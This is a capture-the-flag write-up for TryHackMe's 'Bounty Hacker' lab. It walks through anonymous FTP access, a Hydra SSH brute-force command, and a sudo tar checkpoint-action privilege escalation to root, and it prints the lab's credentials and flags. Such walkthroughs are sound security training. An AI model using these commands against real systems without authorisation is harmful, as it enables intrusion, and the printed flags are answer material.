# 🏴‍☠️ TryHackMe — Bounty Hacker

> **FTP Enumeration | Anonymous Login | Information Disclosure | SSH Brute Force | Linux Privilege Escalation | Sudo Misconfiguration | Tar Abuse**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Category](https://img.shields.io/badge/Category-Linux%20Privilege%20Escalation-orange?style=flat-square&labelColor=555555)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square&labelColor=555555)

---

## 📌 Overview

**Bounty Hacker** is an easy-level Linux machine from TryHackMe that focuses on FTP enumeration, information disclosure, SSH credential discovery, and Linux privilege escalation.

The machine allows anonymous FTP access, which exposes files containing useful information. One of the files contains a password list that can be combined with a list of possible usernames to discover valid SSH credentials.

After gaining access as the `lin` user, checking `sudo` permissions reveals that `/bin/tar` can be executed as `root`. This can be abused using the `tar` checkpoint functionality to obtain a root shell.

### 🎯 Attack Path

```text
FTP Enumeration
       │
       ▼
Anonymous FTP Login
       │
       ▼
Download locks.txt & task.txt
       │
       ▼
Password Discovery
       │
       ▼
Username Enumeration
       │
       ▼
Hydra SSH Brute Force
       │
       ▼
lin SSH Access
       │
       ▼
User Flag
       │
       ▼
sudo -l
       │
       ▼
/bin/tar as Root
       │
       ▼
Tar Checkpoint Abuse
       │
       ▼
Root Shell
       │
       ▼
🏆 Root Flag
```

---

# 🔎 1. Initial Enumeration

The first clue was provided through the web service.

The webpage contained a conversation between several characters, including **Jet, Spike, Ed, and Faye**.

The conversation contained a few interesting clues.

One of the messages mentioned:
```
"You should have access to the device they are talking about on your computer."
```
This suggested that further enumeration of the target machine was required.

<img width="1257" height="326" alt="1-2" src="https://github.com/user-attachments/assets/9cee62d1-56be-4547-82e4-f5cf00e718f1" />

---

# 📂 2. FTP Enumeration

The FTP service was accessible on the target.

I connected to it using:
```
ftp 10.48.177.196
```
The server identified itself as:
```
220 (vsFTPd 3.0.5)
```
I tried logging in using the anonymous account:
```
Username: anonymous
```
The login was successful:
```
230 Login successful.
```
I then listed the contents of the FTP directory:
```
ls
```
Two interesting files were available:
```
locks.txt
task.txt
```
The FTP server therefore allowed us to access files without requiring a legitimate account.

<img width="556" height="228" alt="2" src="https://github.com/user-attachments/assets/3ec1cf10-d26e-4709-a0dd-5b6d3e43c9a6" />

---

# 📥 3. Downloading the FTP Files

I downloaded the available files using:
```
mget *
```
The transfer was successful:
```
226 Transfer complete.
```
The two files were now available locally:
```
locks.txt
task.txt
```

<img width="565" height="215" alt="3" src="https://github.com/user-attachments/assets/c4e5a471-7179-40a0-abba-2669a9a80b3c" />

---

# 📝 4. Reading task.txt

I first inspected task.txt:
```
cat task.txt
```
The file contained:
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
```
Although this did not directly provide a password, it confirmed that the FTP files contained useful information.

<img width="363" height="111" alt="4" src="https://github.com/user-attachments/assets/3797407d-c987-4bfc-b242-7f00dd01daf4" />

The more interesting file was locks.txt.

---

# 🔑 5. Reading locks.txt

Next, I inspected `locks.txt`:
```
cat locks.txt
```
The file contained a large number of password candidates.

Some of the entries included:
```
RedrAGON
ReDdR4gonSynd1cat3
Dr4gOnSynd1c4te
R3DDr460NSYndICaTe
ReddRAGON
R3dDragOnSyndic4te
```
This appeared to be a password wordlist.

<img width="265" height="462" alt="5" src="https://github.com/user-attachments/assets/52298a7b-664b-4da1-8f6e-99dbad0fa0ee" />

At this point, we had a list of potential passwords but still needed a valid username.

---

# 👤 6. Creating the Username List

Based on the information gathered from the machine, I created a list of possible usernames.
```
spike
jet
ed
faye
lin
```
I saved them into:
```
users.txt
```
Now we had two wordlists:
```
users.txt
    +
locks.txt
```
These could be tested against the SSH service.

<img width="226" height="122" alt="6" src="https://github.com/user-attachments/assets/40862c75-bcc5-4aa2-9bc3-e6152d4b78e0" />

---

# 🔐 7. SSH Credential Discovery with Hydra

Since SSH was available, I used Hydra to test the usernames against the password list.
```
hydra ssh://10.48.177.196 -L users.txt -P locks.txt
```
Hydra discovered valid credentials:
```
login: lin
password: RedDr4gonSyndicat3
```
The valid account was:
```
lin
```
with the password:
```
RedDr4gonSyndicat3
```
<img width="623" height="205" alt="7" src="https://github.com/user-attachments/assets/1d19ecd6-7a03-4d10-9889-b918b2105b30" />

---

# 💻 8. SSH Login

I used the discovered credentials to connect to the machine through SSH:
```
ssh lin@10.48.177.196
```
The connection was successful, giving us access as:
```
lin
```
<img width="276" height="54" alt="8" src="https://github.com/user-attachments/assets/1bb14291-5038-4be5-b809-7085be81294c" />

---

# 🏁 9. Obtaining the User Flag

After gaining SSH access, I listed the files in the current directory:
```
ls
```
A file named:
```
user.txt
```
was present.

I read the file:
```
cat user.txt
```
The user flag was:
```
THM{CR1M3_SyNd1C4T3}
```
<img width="401" height="86" alt="9" src="https://github.com/user-attachments/assets/9279f53b-ba8f-4ede-95f1-5bd621ce8163" />


At this point, we had successfully compromised the `lin` account.

The next objective was privilege escalation.

---

# 🔍 10. Checking Sudo Permissions

I checked which commands the `lin` user could execute with elevated privileges:
```
sudo -l
```
The output showed:
```
User lin may run the following commands:
    (root) /bin/tar
```
This was the main privilege-escalation vulnerability.

The `lin` user was allowed to execute:
```
/bin/tar
```
as:
```
root
```
<img width="484" height="122" alt="10" src="https://github.com/user-attachments/assets/2ba6b4c2-ff43-4917-934d-7ff710aa59a1" />

---

# 🧨 11. Exploiting tar for Privilege Escalation

The `tar` utility has a checkpoint feature that can execute a command when a checkpoint is reached.

Because `tar` could be executed using `sudo`, the command would run with root privileges.

I used:
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
The command successfully spawned a shell.

I then verified the current user:
```
whoami
```
The result was:
```
root
```
This confirmed successful privilege escalation.

<img width="925" height="100" alt="11" src="https://github.com/user-attachments/assets/2453a2b2-ba71-46f5-8923-0b4cf6bad6b6" />

---

# 👑 12. Obtaining the Root Flag

After obtaining root access, I attempted to read the root flag:
```
cat /root/root.txt
```
The terminal initially returned:
```
THM{80UN7Y_h4cK3r}
```
<img width="231" height="70" alt="12" src="https://github.com/user-attachments/assets/245bc763-b091-4ad5-bf3a-1f06b28a118d" />
